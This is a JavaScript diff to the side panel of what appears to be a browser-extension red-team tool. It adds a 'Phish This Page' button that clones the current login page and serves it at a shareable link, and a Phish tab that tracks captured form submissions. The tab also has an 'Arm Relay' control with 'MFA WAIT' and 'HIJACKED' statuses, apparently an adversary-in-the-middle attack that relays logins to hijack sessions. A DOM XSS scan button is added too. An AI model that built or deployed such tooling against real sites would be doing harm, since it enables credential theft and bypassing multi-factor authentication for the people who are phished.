@@ -244,6 +244,110 @@
     if (bar) bar.innerHTML = renderCounters(s);
   }
 
+  // ─── Phish This Page button ─────────────────────────────────────────
+
+  const btnPhish = document.getElementById('btn-phish');
+  let phishBtnTimer = null;
+
+  function resetPhishBtn() {
+    btnPhish.textContent = 'Phish This Page';
+    btnPhish.className = 'btn-phish';
+    btnPhish.disabled = false;
+  }
+
+  const phishLiveBar = document.createElement('div');
+  phishLiveBar.id = 'phish-live-bar';
+  phishLiveBar.style.display = 'none';
+  btnPhish.parentElement.insertBefore(phishLiveBar, btnPhish.nextSibling);
+
+  function showPhishLiveBar(serveUrl) {
+    const shortUrl = serveUrl.replace(/^https?:\/\//, '').substring(0, 45);
+    phishLiveBar.style.display = 'flex';
+    phishLiveBar.innerHTML = `
+      <span class="plb-dot"></span>
+      <a class="plb-link" href="#" title="${esc(serveUrl)}">${esc(shortUrl)}</a>
+      <button class="plb-copy" data-url="${esc(serveUrl)}">Copy</button>
+      <button class="plb-dismiss">\u00d7</button>`;
+    phishLiveBar.querySelector('.plb-link').addEventListener('click', (e) => {
+      e.preventDefault();
+      chrome.tabs.create({ url: serveUrl });
+    });
+    phishLiveBar.querySelector('.plb-copy').addEventListener('click', function() {
+      navigator.clipboard.writeText(this.dataset.url).then(() => {
+        this.textContent = '\u2713';
+        setTimeout(() => { this.textContent = 'Copy'; }, 1500);
+      });
+    });
+    phishLiveBar.querySelector('.plb-dismiss').addEventListener('click', () => {
+      phishLiveBar.style.display = 'none';
+    });
+  }
+
+  btnPhish.addEventListener('click', () => {
+    if (btnPhish.classList.contains('cloning')) return;
+    btnPhish.textContent = 'Cloning\u2026';
+    btnPhish.className = 'btn-phish cloning';
+    btnPhish.disabled = true;
+    if (phishBtnTimer) clearTimeout(phishBtnTimer);
+
+    chrome.runtime.sendMessage({ type: 'r3d-phish-this-page' }, (resp) => {
+      if (resp && resp.ok) {
+        const serveUrl = resp.site?.serveUrl || '';
+        btnPhish.textContent = '\u2714 Phish Live!';
+        btnPhish.className = 'btn-phish live';
+        btnPhish.disabled = false;
+        showPhishLiveBar(serveUrl);
+        phishBtnTimer = setTimeout(resetPhishBtn, 8000);
+        if (activeTab === 'phish') renderPhish();
+      } else {
+        btnPhish.textContent = 'Failed \u2014 Retry';
+        btnPhish.className = 'btn-phish failed';
+        btnPhish.disabled = false;
+        phishBtnTimer = setTimeout(resetPhishBtn, 4000);
+      }
+    });
+  });
+
+  // ─── Scan DOM XSS button ────────────────────────────────────────────
+
+  const btnXss = document.getElementById('btn-scan-xss');
+  let xssBtnTimer = null;
+
+  function resetXssBtn() {
+    btnXss.textContent = 'Scan DOM XSS';
+    btnXss.className = 'btn-scan-xss';
+    btnXss.disabled = false;
+  }
+
+  btnXss.addEventListener('click', () => {
+    if (btnXss.classList.contains('scanning')) return;
+    btnXss.textContent = 'Scanning\u2026';
+    btnXss.className = 'btn-scan-xss scanning';
+    btnXss.disabled = true;
+    if (xssBtnTimer) clearTimeout(xssBtnTimer);
+
+    chrome.runtime.sendMessage({ type: 'r3d-dom-xss-scan' }, (resp) => {
+      if (resp && resp.ok) {
+        const count = resp.result?.issues?.length || 0;
+        const created = resp.findingsCreated || 0;
+        if (count > 0) {
+          btnXss.textContent = `${count} Issue${count !== 1 ? 's' : ''} Found`;
+          btnXss.className = 'btn-scan-xss found';
+        } else {
+          btnXss.textContent = 'Clean';
+          btnXss.className = 'btn-scan-xss clean';
+        }
+        btnXss.disabled = false;
+        xssBtnTimer = setTimeout(resetXssBtn, 5000);
+      } else {
+        btnXss.textContent = 'Scan Failed';
+        btnXss.className = 'btn-scan-xss failed';
+        btnXss.disabled = false;
+        xssBtnTimer = setTimeout(resetXssBtn, 4000);
+      }
+    });
+  });
+
   // ─── Tab Content Renderers ─────────────────────────────────────────
 
   function renderTabContent() {
@@ -254,6 +358,7 @@
       case 'systems': renderSystems(); break;
       case 'tokens': renderTokens(); break;
       case 'headers': renderHeaders(); break;
+      case 'phish': renderPhish(); break;
     }
   }
 
@@ -366,6 +471,135 @@
       </div>`;
     }).join('');
   }
+
+  // ─── Phish Tab ─────────────────────────────────────────────────────
+
+  function _spRelayStyle(status) {
+    switch (status) {
+      case 'armed': return 'color:var(--purple)';
+      case 'waiting_for_mfa': return 'color:var(--yellow);animation:pulse 2s infinite';
+      case 'session_hijacked': return 'color:var(--green)';
+      case 'failed': return 'color:var(--red)';
+      default: return 'color:var(--txt-dim)';
+    }
+  }
+
+  function _spRelayLabel(status) {
+    switch (status) {
+      case 'armed': return 'ARMED';
+      case 'waiting_for_mfa': return 'MFA WAIT';
+      case 'session_hijacked': return 'HIJACKED';
+      case 'failed': return 'FAILED';
+      default: return '';
+    }
+  }
+
+  function renderPhish() {
+    const el = document.getElementById('panel-phish');
+    const sites = snapshot?.phishSites || [];
+
+    if (!sites.length) {
+      el.innerHTML = `<div class="empty-hint">
+        <strong>No active phish sites</strong>
+        Browse to a login page and click <em>Phish This Page</em> to clone it.
+      </div>`;
+      return;
+    }
+
+    let html = '<div class="phish-section-label">Active Sites</div>';
+    html += sites.map(s => {
+      const target = s.targetUrl || '';
+      const shortTarget = target.replace(/^https?:\/\//, '').substring(0, 60);
+      const serveUrl = s.serveUrl || '';
+      const ago = s.clonedAt ? fmtDuration(Date.now() - (typeof s.clonedAt === 'string' ? new Date(s.clonedAt).getTime() : s.clonedAt)) : '?';
+      const caps = s.captureCount || 0;
+      return `<div class="phish-site-card" data-site-id="${esc(s.siteId)}">
+        <div class="phish-card-top">
+          <span class="phish-live-dot"></span>
+          <span class="phish-target" title="${esc(target)}">${esc(shortTarget)}</span>
+        </div>
+        <div class="phish-card-meta">
+          <a class="phish-serve-link" href="#" data-url="${esc(serveUrl)}" title="Open phish page: ${esc(serveUrl)}">${esc(serveUrl.replace(/^https?:\/\//, '').substring(0, 50))}</a>
+          <span class="phish-ago">${ago} ago</span>
+        </div>
+        <div class="phish-card-stats">
+          <span class="phish-captures ${caps > 0 ? 'has-captures' : ''}">${caps} capture${caps !== 1 ? 's' : ''}</span>
+          <span class="phish-relay-status" style="margin-left:8px;font-size:9px;font-weight:800;font-family:var(--mono);${_spRelayStyle(s.relay?.status)}">${_spRelayLabel(s.relay?.status)}</span>
+        </div>
+        <div class="phish-card-actions">
+          <button class="btn btn-sm phish-action-relay" data-id="${esc(s.siteId)}" data-enabled="${s.relay?.enabled ? '1' : '0'}" data-url="${esc(target)}">${s.relay?.enabled ? 'Disarm' : 'Arm Relay'}</button>
+          <button class="btn btn-sm phish-action-copy" data-url="${esc(serveUrl)}">Copy Link</button>
+          <button class="btn btn-sm phish-action-open" data-url="${esc(serveUrl)}">Open</button>
+          <button class="btn btn-sm phish-action-delete" data-id="${esc(s.siteId)}">Delete</button>
+        </div>
+      </div>`;
+    }).join('');
+
+    const allCaptures = sites.filter(s => (s.captures || []).length > 0);
+    if (allCaptures.length) {
+      html += '<div class="phish-section-label" style="margin-top:10px">Recent Captures</div>';
+      for (const site of allCaptures) {
+        for (const cap of (site.captures || []).slice(-10).reverse()) {
+          const ts = cap.ts ? new Date(cap.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '';
+          const fields = cap.fieldCount || Object.keys(cap.fields || {}).length || 0;
+          const type = cap.t || 'form';
+          html += `<div class="phish-capture-item">
+            <span class="feed-time">${ts}</span>
+            <span class="phish-cap-type">${esc(type)}</span>
+            <span class="phish-cap-fields">${fields} field${fields !== 1 ? 's' : ''}</span>
+          </div>`;
+        }
+      }
+    }
+
+    el.innerHTML = html;
+
+    el.querySelectorAll('.phish-serve-link').forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        chrome.tabs.create({ url: link.dataset.url });
+      });
+    });
+    el.querySelectorAll('.phish-action-copy').forEach(btn => {
+      btn.addEventListener('click', () => {
+        navigator.clipboard.writeText(btn.dataset.url).then(() => {
+          btn.textContent = 'Copied!';
+          setTimeout(() => { btn.textContent = 'Copy Link'; }, 1500);
+        });
+      });
+    });
+    el.querySelectorAll('.phish-action-open').forEach(btn => {
+      btn.addEventListener('click', () => chrome.tabs.create({ url: btn.dataset.url }));
+    });
+    el.querySelectorAll('.phish-action-delete').forEach(btn => {
+      btn.addEventListener('click', () => {
+        chrome.runtime.sendMessage({ type: 'r3d-phish-delete', siteId: btn.dataset.id });
+        btn.closest('.phish-site-card')?.remove();
+      });
+    });
+    el.querySelectorAll('.phish-action-relay').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const nowEnabled = btn.dataset.enabled === '1';
+        chrome.runtime.sendMessage({
+          type: 'r3d-phish-relay-toggle',
+          siteId: btn.dataset.id,
+          enabled: !nowEnabled,
+          loginUrl: btn.dataset.url,
+        }, () => {
+          chrome.runtime.sendMessage({ type: 'r3d-phish-list' });
+        });
+      });
+    });
+  }
+
+  // When switching to phish tab, refresh the list from proxy
+  document.querySelectorAll('.sp-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      if (tab.dataset.tab === 'phish') {
+        chrome.runtime.sendMessage({ type: 'r3d-phish-list' });
+      }
+    });
+  });
 
   // ─── Helpers ───────────────────────────────────────────────────────
 
